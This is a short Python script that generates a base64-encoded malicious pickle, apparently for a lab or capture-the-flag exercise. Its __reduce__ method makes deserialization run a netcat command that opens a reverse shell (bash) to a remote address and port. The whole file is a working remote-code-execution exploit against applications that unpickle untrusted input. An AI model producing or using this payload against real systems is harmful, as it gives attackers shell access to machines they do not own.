#!/usr/bin/python3
import pickle
import base64
import os

class rce(object):
  def __reduce__(self):
    # this method will execute on deserialization :)
    return (os.system, ('nc -e /bin/bash 10.0.2.2 1337',))

# base64-encode and print the payload
print(base64.b64encode(pickle.dumps(rce())).decode('utf-8'))
